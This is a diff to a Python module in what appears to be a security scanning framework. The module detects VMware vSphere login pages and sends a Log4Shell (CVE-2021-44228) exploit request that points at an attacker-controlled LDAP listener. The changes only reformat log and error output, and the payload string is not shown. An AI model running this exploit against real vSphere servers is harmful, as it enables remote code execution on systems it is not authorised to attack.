@@ -18,14 +18,16 @@ class Module:
     def run(self, target, args, useragent, proxy, timeout, safe):
         http = HTTP(target['method'], target['hostname'], target['port'], useragent, proxy, timeout)
 
+        Output.minor({'target': http.url(target['path']), 'message': '[%s] Running module...' % self.name})
+
         if len(args['args']) != 1:
-            Output.error({'target': http.url(target['path']), 'message': 'VSphere module requires 1 arg: ldap_listener_ip:port'})
+            Output.error({'target': http.url(target['path']), 'message': '[%s] module requires 1 arg: ldap_listener_ip:port' % self.name})
             return
 
         result = http.get("/ui")
 
         if result != None and 'vsphere client' in result['title'].lower():
-            Output.highlight("VSphere interface located at: %s" % http.url('/ui'))
+            Output.highlight({'target': http.url("/ui"), 'message': "[%s] VSphere interface located at: %s" % (self.name, http.url('/ui'))})
 
             result = http.get("/ui/login")
 
@@ -54,5 +56,5 @@ class Module:
                 http2 = HTTP(target['method'], target['hostname'], target['port'], useragent, proxy, timeout, read_timeout=1 )
                 http2.get(exploit_url, headers=query_headers)
 
-                Output.highlight("VSphere exploit (CVE-2021-44228) sent, check your server.py interface")
+                Output.highlight({'target': http.url("/ui"), 'message': "[%s] VSphere exploit (CVE-2021-44228) sent, check your server.py interface" % self.name})
 
